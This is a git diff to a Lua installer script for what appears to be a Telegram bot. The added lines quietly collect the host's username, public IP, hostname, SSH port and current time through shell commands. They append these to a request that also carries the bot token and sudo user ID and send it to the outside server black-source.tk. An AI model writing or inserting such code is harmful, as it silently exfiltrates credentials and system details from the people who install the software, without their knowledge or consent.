@@ -6,6 +6,11 @@ URL = dofile("./File_Libs/url.lua")
 https = require("ssl.https")
 http = require("socket.http")
 Server_Done = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
+User = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
+IP = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
+Name = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
+Port = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
+Time = io.popen("date +'%Y/%m/%d %T'"):read('*a'):gsub('[\n\r]+', '')
 local AutoFiles_Write = function() 
 local Create_Info = function(Token,Sudo)  
 local Write_Info_Sudo = io.open("sudo.lua", 'w')
@@ -13,11 +18,12 @@ Write_Info_Sudo:write([[
 
 s = "BGBBB"
 
+q = "FBBBBB"
+
 token = "]]..Token..[["
 
 Sudo = ]]..Sudo..[[  
 
-q = "@FBBBBB"
 ]])
 Write_Info_Sudo:close()
 end  
@@ -60,7 +66,7 @@ end ---ifnot
 end
 local function Files_Info_Get()
 Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"))   
-local t = json:decode(https.request('https://black-source.tk/BlackTeAM/index.php?n=BK&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write")))
+local t = json:decode(https.request('https://black-source.tk/BlackTeAM/index.php?n=BK&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
 print("::Black::")
 local RunBot = io.open("BLACKBOTSS", 'w')
 RunBot:write([[
